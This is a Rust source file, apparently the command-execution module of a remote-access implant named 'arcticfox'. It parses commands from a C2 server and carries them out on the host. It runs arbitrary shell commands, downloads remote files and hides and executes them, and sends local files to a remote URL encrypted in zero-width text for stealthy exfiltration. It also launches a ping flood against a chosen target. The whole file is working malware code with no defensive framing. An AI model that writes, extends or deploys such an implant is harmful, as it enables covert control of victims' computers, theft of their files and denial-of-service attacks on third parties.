//! Command executor: safely executes shell commands from C2 payloads.
//!
//! Supports:
//! - `cmd <shell>` / `shell <shell>` — execute shell command
//! - `download <url> <dest> [RUN] [HIDE]` — download and optionally execute file
//! - `upload <local_path> <url>` — exfiltrate file to C2 server
//! - `exfil <path>` — read and return file contents
//! - `dos <target> <seconds>` — simple flood (max 300s)
//! - `popmsg <message>` — display message (cross-platform)
//!
//! All execution is time-bounded and output-capped.

use std::process::Stdio;
use std::time::Duration;
use tokio::process::Command;
use tracing::{debug, error, warn};

use arcticfox_core::crypto::{generate_nonce, generate_session_key};
use arcticfox_core::error::Result;
use arcticfox_zwtransport::seal_oneshot;

const MAX_SHELL_OUTPUT: usize = 1_048_576; // 1 MB
const SHELL_TIMEOUT: Duration = Duration::from_secs(60);
const DOS_MAX_SECS: u64 = 300;

/// Parse and execute a single command from the C2 payload.
pub async fn execute_command(cmd: &str) -> Result<String> {
    let parts: Vec<&str> = cmd.splitn(2, ' ').collect();
    let action = parts.first().map(|s| s.to_lowercase()).unwrap_or_default();

    match action.as_str() {
        "cmd" | "shell" => {
            let shell_cmd = parts.get(1).unwrap_or(&"");
            execute_shell(shell_cmd).await
        }
        "download" => {
            let args = parts.get(1).unwrap_or(&"");
            execute_download(args).await
        }
        "upload" | "exfil" => {
            let args = parts.get(1).unwrap_or(&"");
            execute_upload(args).await
        }
        "dos" => {
            let args = parts.get(1).unwrap_or(&"");
            execute_dos(args).await
        }
        "popmsg" => {
            let msg = parts.get(1).unwrap_or(&"");
            execute_popmsg(msg).await
        }
        _ => {
            // Unknown commands are treated as shell commands for flexibility
            execute_shell(cmd).await
        }
    }
}

/// Execute a shell command with timeout and output capture.
async fn execute_shell(cmd: &str) -> Result<String> {
    if cmd.is_empty() {
        return Ok(String::new());
    }

    debug!("Executing shell: {}", cmd);

    // Use platform-appropriate shell
    let (shell, shell_flag) = if cfg!(target_os = "windows") {
        ("cmd", "/C")
    } else {
        ("sh", "-c")
    };

    let output = Command::new(shell)
        .arg(shell_flag)
        .arg(cmd)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .stdin(Stdio::null())
        .kill_on_drop(true)
        .output()
        .await;

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout).to_string();
            let stderr = String::from_utf8_lossy(&out.stderr).to_string();
            
            let combined = if stderr.is_empty() {
                stdout
            } else {
                format!("{}\n{}", stdout, stderr)
            };

            // Truncate output
            if combined.len() > MAX_SHELL_OUTPUT {
                let truncated = &combined[..MAX_SHELL_OUTPUT];
                Ok(format!("{}... [truncated]", truncated))
            } else {
                Ok(combined)
            }
        }
        Err(e) => {
            error!("Shell execution failed: {e}");
            Ok(format!("[error: {}]", e))
        }
    }
}

/// Download a file from a URL, optionally execute and/or hide it.
async fn execute_download(args: &str) -> Result<String> {
    let tokens: Vec<&str> = args.split_whitespace().collect();
    if tokens.len() < 2 {
        return Ok("[error: usage: download <url> <dest> [RUN] [HIDE]]".into());
    }

    let url = tokens[0];
    let dest = tokens[1];
    let run = tokens.iter().any(|t| t.eq_ignore_ascii_case("RUN"));
    let hide = tokens.iter().any(|t| t.eq_ignore_ascii_case("HIDE"));

    debug!("Downloading {} -> {} (run={}, hide={})", url, dest, run, hide);

    // Download
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(30))
        .build()
        .map_err(|e| arcticfox_core::error::ArcticFoxError::Internal {
            message: format!("Client build error: {e}"),
        })?;

    let resp = client.get(url).send().await.map_err(|e| {
        arcticfox_core::error::ArcticFoxError::Http {
            url: url.into(),
            source: e,
        }
    })?;

    let bytes = resp.bytes().await.map_err(|e| {
        arcticfox_core::error::ArcticFoxError::Http {
            url: url.into(),
            source: e,
        }
    })?;

    // Write to destination
    std::fs::write(dest, &bytes).map_err(|e| {
        arcticfox_core::error::ArcticFoxError::FileWrite {
            path: dest.into(),
            source: e,
        }
    })?;

    // Hide the file
    if hide {
        if cfg!(target_os = "windows") {
            let _ = std::process::Command::new("attrib")
                .args(["+H", dest])
                .output();
        } else {
            // Rename to hidden dotfile
            let path = std::path::Path::new(dest);
            if let Some(parent) = path.parent() {
                if let Some(name) = path.file_name() {
                    let hidden = parent.join(format!(".{}", name.to_string_lossy()));
                    let _ = std::fs::rename(path, &hidden);
                }
            }
        }
    }

    // Execute the file
    if run {
        #[cfg(target_os = "windows")]
        {
            let _ = std::process::Command::new("cmd")
                .args(["/C", "start", dest])
                .spawn();
        }
        #[cfg(not(target_os = "windows"))]
        {
            let _ = std::fs::set_permissions(dest, std::os::unix::fs::PermissionsExt::from_mode(0o755));
            let _ = std::process::Command::new(dest).spawn();
        }
    }

    Ok(format!("Downloaded to {}", dest))
}

/// Exfiltrate a local file to a remote URL (HTTP POST).
async fn execute_upload(args: &str) -> Result<String> {
    let tokens: Vec<&str> = args.splitn(2, ' ').collect();
    if tokens.is_empty() {
        return Ok("[error: usage: upload <local_path> [<url>]]".into());
    }

    let path = tokens[0].trim();
    let upload_url = tokens.get(1).map(|s| s.trim()).unwrap_or("");

    // Read local file
    let data = match std::fs::read(path) {
        Ok(d) => d,
        Err(e) => return Ok(format!("[error: cannot read {}: {}]", path, e)),
    };

    const MAX_UPLOAD_SIZE: usize = 1_048_576;

    // If no URL provided, return contents inline (for small files only)
    if upload_url.is_empty() {
        let preview = if data.len() > 8192 {
            format!("{}... [{} bytes total]", String::from_utf8_lossy(&data[..8192]), data.len())
        } else {
            String::from_utf8_lossy(&data).to_string()
        };
        return Ok(format!("[exfil {}: {}]", path, preview));
    }

    // Explicly check size before upload
    if data.len() > MAX_UPLOAD_SIZE {
        return Ok(format!("[error: file too large for upload ({} bytes > {} limit)]", data.len(), MAX_UPLOAD_SIZE));
    }

    // ZW-encode data: inject into innocent-looking text for stealth exfil
    let key = generate_session_key();
    let nonce = generate_nonce();
    let zw_body = match seal_oneshot(&key, &nonce, &data) {
        Ok(zw) => zw,
        Err(_) => return Ok("[error: encryption failed]".into()),
    };

    // Wrap in a form-like body with nonce
    let body_text = format!("n={}\n{}", hex::encode(nonce), zw_body);

    // POST to URL
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(30))
        .build()
        .map_err(|e| arcticfox_core::error::ArcticFoxError::Internal {
            message: format!("Client build error: {e}"),
        })?;

    let resp = client
        .post(upload_url)
        .body(body_text)
        .send()
        .await
        .map_err(|e| arcticfox_core::error::ArcticFoxError::Http {
            url: upload_url.into(),
            source: e,
        })?;

    Ok(format!("Exfiltrated {} ({} bytes) -> status {}", path, resp.content_length().unwrap_or(0), resp.status()))
}

/// Simple DoS flood using ping -f (max 300 seconds).
async fn execute_dos(args: &str) -> Result<String> {
    let tokens: Vec<&str> = args.split_whitespace().collect();
    if tokens.len() < 2 {
        return Ok("[error: usage: dos <target> <seconds>]".into());
    }

    let target = tokens[0];
    let secs: u64 = tokens.last().unwrap_or(&"0").parse().unwrap_or(0);
    let actual = secs.min(DOS_MAX_SECS);

    debug!("DoS flood: {} for {}s", target, actual);

    let _ = tokio::process::Command::new("timeout")
        .args([&actual.to_string(), "ping", "-f", target])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .stdin(Stdio::null())
        .spawn();

    Ok(format!("Flood started: {} for {}s", target, actual))
}

/// Display a pop-up message (cross-platform).
async fn execute_popmsg(msg: &str) -> Result<String> {
    if msg.is_empty() {
        return Ok(String::new());
    }

    debug!("Popup message: {}", msg);

    // Write to temp HTML file and open in browser
    let safe_msg = html_escape(msg);
    let html = format!(
        "<html><body style='font-family:sans-serif;padding:2em;'><h2>{}</h2></body></html>",
        safe_msg
    );

    let temp_path = std::env::temp_dir().join(format!("msg_{}.html", rand::random::<u32>()));

    if let Err(e) = std::fs::write(&temp_path, &html) {
        warn!("Could not write popup HTML: {e}");
        return Ok(format!("[error: {}]", e));
    }

    #[cfg(target_os = "linux")]
    {
        let _ = std::process::Command::new("xdg-open")
            .arg(&temp_path)
            .spawn();
    }
    #[cfg(target_os = "macos")]
    {
        let _ = std::process::Command::new("open")
            .arg(&temp_path)
            .spawn();
    }
    #[cfg(target_os = "windows")]
    {
        let _ = std::process::Command::new("rundll32")
            .args(["url.dll,FileProtocolHandler", &temp_path.to_string_lossy()])
            .spawn();
    }

    // Clean up after 30 seconds
    let path = temp_path.clone();
    tokio::spawn(async move {
        tokio::time::sleep(Duration::from_secs(30)).await;
        let _ = std::fs::remove_file(&path);
    });

    Ok("Popup displayed".into())
}

/// Simple HTML escaping for popup messages.
fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
}
